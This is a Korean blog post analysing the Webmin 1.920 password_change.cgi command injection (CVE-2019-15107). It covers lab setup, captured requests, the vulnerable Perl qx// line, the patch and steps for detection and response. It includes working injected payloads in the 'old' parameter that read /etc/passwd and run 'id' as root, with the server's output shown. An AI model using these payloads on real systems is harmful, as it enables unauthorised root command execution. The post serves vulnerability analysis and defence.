---
layout: post
title: '[위협] Webmin password change RCE(CVE-2019-15107)'
subtitle: 'threat, webmin'
categories: threat
tags: application
comments: true
---

> 이 글은 어플리케이션 취약점을 분석한 글입니다. 출처: https://chybeta.github.io/2019/08/19/%E3%80%90CVE-2019-15107%E3%80%91-RCE-in-Webmin-1-920-via-password-change/

# Webmin password change RCE 

- Webmin-1.920-1
- CentOS 8

![](https://chanbin.github.io/assets/img/webmin/1.png)

<br>
<br>

취약성을 가진 환경을 만들기 위해선 Webmin의 웹 기반 계정에 `패스워드 만료 정책` 기능이 활성화 되어있어야 한다. 또한, github repository가 아닌 `sourceforge`사이트에서 받은 패키지만 가능하다.

```xml
https://192.168.56.101:10000/webmin/edit_session.cgi
```

기존의 Password expiry policy에서 `암호가 만료된 사용자는 항상 거부` 항목에서 `암호가 만료된 사용자에게 새 암호를 입력하도록 요청` 항목으로 변경해야 한다.

![](https://chanbin.github.io/assets/img/webmin/2.png)

<br>
<br>

webmin 서버 재부팅 후 설정이 적용된다. 해당 내용은 서버에 직접 접근하여 확인할 수 있다.

```bash
# cat /etc/webmin/miniserv.conf

...
passwd_mode=2
...
```

<br>
<br>

## 이제 직접 공격해 보도록 하자. 

비밀번호 요청을 변경하기 위해선 먼저, 암호가 만료되어야 한다.

아래와 같이 root계정 비밀번호를 변경하려는 시도를 하면 비밀번호가 만료된다.

![](https://chanbin.github.io/assets/img/webmin/3.png)

`Force change at next login`을 선택하고, Save해야 한다.

다음으로는, `root`계정 선택하고 `Delete Selected`버튼을 눌러준다. 물론 본인의 계정이라 지워지진않고 계정 만료가 된다. 

<br>
<br>

로그아웃하고 나와서 다시 `root`계정으로 변경했던 비빌번호로 로그인하면, 아래와 같이 비밀번호 변경화면이 나온다.

![](https://chanbin.github.io/assets/img/webmin/4.png)

<br>
<br>

비밀번호 변경 요청을 하고 Fiddler로 해당 요청을 잡은 화면이다.

```http
POST https://192.168.56.101:10000/password_change.cgi HTTP/1.1
Host: 192.168.56.101:10000
Connection: keep-alive
Content-Length: 61
Cache-Control: max-age=0
Origin: https://192.168.56.101:10000
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36
Sec-Fetch-User: ?1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Referer: https://192.168.56.101:10000/session_login.cgi
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: redirect=1; testing=1; sessiontest=1; sid=x

user=root&pam=&expired=2&old=pass12&new1=pass123&new2=pass123
```

<br>
<br>

해당 파라미터 중 `old`값에 `|cat /etc/passwd`를 추가해 본다.

```bash
user=root&pam=&expired=2&old=pass12|cat /etc/passwd&new1=123123&new2=123123
```

<br>
<br>

정상적인 응답값 아래에 원격 코드 실행에 대한 응답값이 들어있다.

```xml
...
</head>
<body data-uri="/password_change.cgi" >
 <div class="container-fluid col-lg-10 col-lg-offset-1" data-dcontainer="1">
<div class="panel panel-default">
<div class="panel-heading">
<table class="header"><tr>
<td id="headln2l" class="invisible"></td>
<td data-current-module-name="" id='headln2c'><span data-main_title></span></td>
<td id="headln2r"></td></tr></table>
</div>
<div class="panel-body">
<hr>
<center><h3>Failed to change password : The current password is incorrectroot:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
...
```

<br>
<br>

`root`가 아닌 다른 계정으로 시도해본다. `root`권한으로 새로운 webmin 계정 생성이 가능하고, 해당 계정에 대한 첫 접근 시에, 기존과 동일한 패스워드 변경 화면이 나온다.  

```bash
user=guest&pam=&expired=2&old=asdf| id&new1=qwer&new2=qwer
```

<br>
<br>

정상적인 응답값 아래에 원격 코드 실행에 대한 응답값이 들어있다.

```xml
...
</head>
<body data-uri="/password_change.cgi" >
 <div class="container-fluid col-lg-10 col-lg-offset-1" data-dcontainer="1">
<div class="panel panel-default">
<div class="panel-heading">
<table class="header"><tr>
<td id="headln2l" class="invisible"></td>
<td data-current-module-name="" id='headln2c'><span data-main_title></span></td>
<td id="headln2r"></td></tr></table>
</div>
<div class="panel-body">
<hr>
<center><h3>Failed to change password : The current password is incorrectuid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:initrc_t:s0
</h3></center>
<hr>
</div>
...
```

![](https://chanbin.github.io/assets/img/webmin/5.png)

<br>
<br>

## 이제 분석해 보도록 하자. 

해당 취약점은 만료된 패스워드를 변경해주는 password_change.cgi파일에서, 잘못된 요청에 대한 검증을 하지 않기 때문이다.

Webmin 1.890 아래로는 expired값에 명령어를 삽입하면 동작한다.<br>Webmin 1.900 부터 1.920 까지는 old값에 명령어를 삽입하면 동작한다.

<br> 

### `/usr/libexec/webmin`경로에 `password_change.cgi`파일이 존재한다. 해당 파일을 자세히 들여다 보자.

```bash
# line 18 ~ line 31
# Is this a Webmin user?
if (&foreign_check("acl")) {
	&foreign_require("acl", "acl-lib.pl");
	($wuser) = grep { $_->{'name'} eq $in{'user'} } &acl::list_users();
	if ($wuser->{'pass'} eq 'x') {
		# A Webmin user, but using Unix authentication
		$wuser = undef;
		}
	elsif ($wuser->{'pass'} eq '*LK*' ||
	       $wuser->{'pass'} =~ /^\!/) {
		&pass_error("Webmin users with locked accounts cannot change ".
		       	    "their passwords!");
		}
	}
```

3번째 줄은 해당 유저가 Webmin유저인지 확인하는 과정이다.
객체 `$wuser` = 파라미터 `user`의 값이다.

만약, Webmin user에 특정 유저가 있고, `user`의 값과 일치한다면 객체 $wuser는 해당 유저의 이름이 된다. 일치하지 않는다면 `undef`상태가 된다.(6번째 줄)

<br> 

### `password_change.cgi`파일의 37번째 줄을 확인하면, 이전 패스워드 암호화와 패스워드 에러처리 구문을 가지고 있다.

```bash
if ($wuser) {
	# Update Webmin user's password
	$enc = &acl::encrypt_password($in{'old'}, $wuser->{'pass'});
	$enc eq $wuser->{'pass'} || &pass_error($text{'password_eold'},qx/$in{'old'}/);
```

여기서 Webmin은 이전 패스워드 `old`를 암호화 하고 객체 $wuser의 `pass`값과 비교한다.

실패한다면, `password_eold`에 들어있는 문자열과 함께 `qx/~~/` 구문을 사용한다. `qx/~~/`는 Perl의 인용부호로 뒤에 나오는 `~~`에 들어오는 문자열을 실행하는 기능을 가지고 있다. 나머지 구문을 확인하면 $in 객체에 들어오는 `old`값에 대한 검증이 없다. 이로 인해서, `old` 파라미터에 파이프 라인을 이용한 명령어를 삽입시에 해당 명령어가 실행되는 것이다.

물론, `password_change.cgi`파일의 권한은 `root`이기 때문에 `old` 파라미터의 모든 값은 `root`권한으로 실행된다.

![](https://chanbin.github.io/assets/img/webmin/6.png)

<br>
<br>

> Webmin 개발자는 $in 객체에 `old`를 담아서 실행한다면, 잘못된 패스워드 입력시에 출력되는 시스템 에러`만` 보여준다고 생각했었나보다.

<br> 

### [번외] Webmin 1.890 버전에서의 취약점

해당 버전에서는 `expired` 파라미터를 `qx/~~/`구문에 넣어서 에러값을 출력하도록 설정했다. 패스워드 만료정책이 설정되어 있지 않다면 변경시 에러를 출력하는게 맞으니까...

Webmin 1.900 버전 부터는 해당 구문 전에 `$miniserv{'passwd_mode'} == 2 || die "Password changing is not enabled!"` 조건을 걸어서 패스워드 정책과 맞지않으면 뒤에 스태틱 문자열만 출력하도록 설정했다.

이번 주요 테스트에서는 미리 만료정책을 설정하여 해당 구문을 통과했다.

<br>
<br>

## 패치 현황

현재 Webmin 1.930 버전 부터는 해당 코드가 패치되었다. 명령 실행이 가능한 `qx/~~/` 구문을 삭제하였다.

```bash
if ($wuser) {
	# Update Webmin user's password
	$enc = &acl::encrypt_password($in{'old'}, $wuser->{'pass'});
	$enc eq $wuser->{'pass'} || &pass_error($text{'password_eold'});
```

<br>
<br>

## CERT 관점에서의 대응 

해당 공격이 성공하려면 `expired` 또는 `old` 파라미터에 파이프라인`(|)`이 필요하다. 비밀번호 문자열과 명령어가 분리되어야 명령의 기능을 제대로 수행한다.

해당 패킷 탐지 시,

1. `expired` 파라미터에 파이프라인`(|)`을 확인한다.<br>
2. `expired` 파라미터에 값`(2)`를 확인한다.<br>
3. `old` 파라미터에 파이프라인`(|)`을 확인한다.<br>
4. 고객사에 해당 내용 전달하고, 출발지 IP에 대한 방화벽 차단을 협의한다.<br>

<br>
<br>

## 고객사 관점에서의 대응

해당 패킷 탐지 시,

1. 출발지 IP에 대한 방화벽 차단을 진행한다.<br>
2. Webmin Application을 1.930 버전으로 업데이트한다.<br>
